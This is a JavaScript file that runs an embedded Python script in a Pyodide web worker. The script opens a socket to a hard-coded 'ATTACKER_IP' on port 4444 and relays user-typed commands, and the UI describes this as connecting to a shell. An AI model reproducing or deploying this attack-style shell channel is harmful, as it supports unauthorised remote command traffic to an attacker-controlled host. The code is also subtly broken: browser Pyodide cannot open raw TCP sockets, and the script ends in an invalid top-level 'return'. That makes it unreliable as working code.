// 1. Initialize the Web Worker globally
const pythonWorker = new Worker('py-worker.js', { type: 'module' });
const logElement = document.getElementById('output_log');
const runButton = document.getElementById('run_btn');
const inputDataField = document.getElementById('input_data');

let pyodideReady = false;

// 2. Listener for Worker Messages
pythonWorker.onmessage = function (event) {
    const { status, result, error, ready } = event.data;

    if (status === "ready") {
        pyodideReady = true;
        logElement.textContent = "Python runtime ready. Ready to connect to the shell.";
        runButton.disabled = false; // Enable button once ready
        return;
    }

    if (status === "success") {
        // The result is the return value of the last line in Python
        logElement.textContent = `SUCCESS/RETURN VALUE:\n${result}`;
        // For an interactive shell, you would typically re-run executeCommand() here
        // to automatically fetch the next command, but for simplicity, we let the user click again.

    } else {
        logElement.textContent = `EXECUTION ERROR:\n${error}`;
    }
};

// 3. Worker Failure Handler
pythonWorker.onerror = function (event) {
    logElement.textContent = `WORKER ERROR: ${event.message}`;
    console.error('py-worker.js failed:', event);
};

// 4. Execution Logic
async function executeCommand() {
    const inputData = inputDataField.value;

    if (!pyodideReady) {
        logElement.textContent = "Python runtime is still loading — please wait a moment and try again.";
        return;
    }

    logElement.textContent = `[INFO] Executing command: ${inputData}\n--- CONNECTING ---`;
    runButton.disabled = true; // Lock button during execution

    // --- The FULL Python Script with Interactive/Command Logic ---
    const pythonScript = `
# This logic needs to be executed by Pyodide
import socket
import time
import sys # Imported to allow reading from stdin (if needed)

ATTACKER_IP = "172.26.233.12"
PORT = 4444

# --- FUNCTION TO HANDLE SINGLE COMMAND EXECUTION ---
def execute_command_shell(command_to_run, initial_data=None):
    try:
        # 1. Setup socket connection
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ATTACKER_IP, PORT))

        # 2. Send connection confirmation
        s.sendall(b"Connection established.\n")

        # 3. Execute the command provided by the UI
        if command_to_run:
            print(f"[PYTHON] Sending command: {command_to_run}")
            s.sendall((command_to_run + '\\n').encode())

        # 4. Receive the response
        data = s.recv(4096) # Increase buffer size for larger responses
        if not data:
            return "Connection closed by remote host."

        return data.decode().strip()

    except Exception as e:
        return f"CONNECTION ERROR: {e}"
    finally:
        # Ensure socket is closed even if an exception occurs
        if 's' in locals() and s:
             s.close()

# --- MAIN ENTRY POINT ---
# Since we are simulating one-shot execution from JS, we call the handler function.
# The return value of this final call becomes the 'result'.
return execute_command_shell(command_to_run=js_input) 
`; // NOTE: js_input is assumed to be the input data provided by JS

// 4. Send Payload
// The worker will read the 'data' property and pass it to the 'js_input' variable inside the script.
pythonWorker.postMessage({
    code: pythonScript,
    data: inputData
});
}

// Event Listener Setup
runButton.addEventListener('click', executeCommand);